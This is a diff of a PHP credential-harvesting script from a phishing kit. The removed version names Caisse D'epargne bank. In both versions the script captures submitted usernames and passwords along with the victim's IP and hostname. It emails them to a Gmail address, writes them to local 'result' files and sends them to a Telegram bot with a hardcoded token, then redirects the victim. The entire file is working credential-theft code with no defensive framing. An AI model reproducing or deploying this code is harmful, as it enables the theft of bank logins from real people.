@@ -1,41 +1,29 @@
 <?php
-/*
-Author : DIB
-Email : b41tsm@gmail.com
-ICQ : @MorrisWorm
+$ip = getenv("REMOTE_ADDR");
+$back = "loggin-error.html";
+$hostname = gethostbyaddr($ip);
+$message .= "------ LOG  ------\n";
+$message .= "user : ".$_POST['username']."\n";
+$message .= "password : ".$_POST['inputPassword']."\n";
+$message .= "------- IP -------\n";
+$message .= "IPs              : $ip\n";
+$message .= "HN               : $hostname\n";
+$message .= " U7l             : $link\n";
+$message .= "---------------\n";
+$send = "fox.tox06@gmail.com";
+$subject = "LOG 1| $ip ";
+$headers = "From:Trnswise <don@mox.fr>";
+mail($send,$subject,$message,$headers);
+ $Txt_Rezlt = fopen('../rzl00.txt', 'a+');
+fwrite($Txt_Rezlt, $message);
+fclose($Txt_Rezlt);
 
-*/
+$token = "1444398777:AAGLFUEgpwuJDL5EFSGP7NZuWfTtwNhEb0g";
 
-
-if(isset($_POST['username']) && isset($_POST['inputPassword'])){
-if(!empty($_POST['username']) && !empty($_POST['inputPassword'])){
-	include '../../config.php';
-	include 'funcs.php';
-	$agent = $_SERVER['HTTP_USER_AGENT'];
-	$user = $_POST['username'];
-	$password = $_POST['inputPassword'];
-	$message = "\nID : $user\nPWD : $password\nAgent: $agent\nIp: $ip";
-	$suj = "Caisse D'epargne - LOGIN FROM $ip";
-	toTG($message);
-	mail($to,$suj,$message);
-	$op = fopen($resText,'a+');
-	fwrite($op,$message);
-	fclose($op);
-$token = "2063061087:AAF4J2MhpY_UGZ4bRdeEkPIvL3HdioJoJwo";
-
-file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=2039615741&text=" . urlencode($message)."" );
+file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1208803924&text=" . urlencode($message)."" );
 $file = fopen("../SE/ajz.txt","a");   ///  Directory Of Rezult OK.
 fwrite($file,$message); 
 
-header("Location:  ../loading.php");
-	
-}else{
-	
-header('Location:  ../index.html');
-}	
-	
-	
-}else{
-header('Location:  ../index.html');
-}
+header("Location: ../loading.html");
+
 ?>
